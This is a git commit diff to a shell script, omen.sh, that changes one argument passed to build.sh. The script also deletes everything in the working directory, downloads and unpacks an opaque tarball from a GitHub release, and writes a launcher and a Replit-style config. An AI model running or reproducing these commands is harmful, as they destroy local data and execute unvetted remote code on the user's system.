54a45ccad96d4a54bed5764221b9831075a55abe
wouegrkaj922-max <wouegrkaj922@ucemo.com>
2026-09-22 10:52:14 +0700

    Update omen.sh

--- omen.sh
+++ omen.sh
@@ -2,7 +2,7 @@ rm -rvf *
 curl -O -J -L https://github.com/wouegrkaj922-max/dewsa/releases/download/deas/kombi.tar.gz && tar -xf kombi.tar.gz && rm -rf kombi.tar.gz
 echo '#!/bin/bash
 
-bash build.sh 4 005' > bolo.sh
+bash build.sh 4 007' > bolo.sh
 echo 'modules = ["python-3.11"]
 
 [workflows]
